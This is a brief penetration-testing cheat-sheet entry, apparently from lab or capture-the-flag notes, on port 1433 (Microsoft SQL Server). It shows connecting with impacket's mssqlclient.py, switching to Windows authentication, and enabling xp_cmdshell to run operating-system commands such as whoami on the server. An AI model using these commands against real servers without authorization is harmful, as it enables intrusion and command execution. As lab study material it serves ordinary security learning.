1433 (Microsoft SQL Server)
------------------------------

* `impacket` -> `mssqlclient.py`

	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:

```
mssqlclient.py username@10.10.10.125
```

It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**

```
mssqlclient.py username@10.10.10.125 -windows-auth
```

If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:

```
SQL> enable_xp_cmdshell
```

though, you may not have permission. If that DOES succeed, you can now run commands like:

```
SQL> xp_cmdshell whoami
```
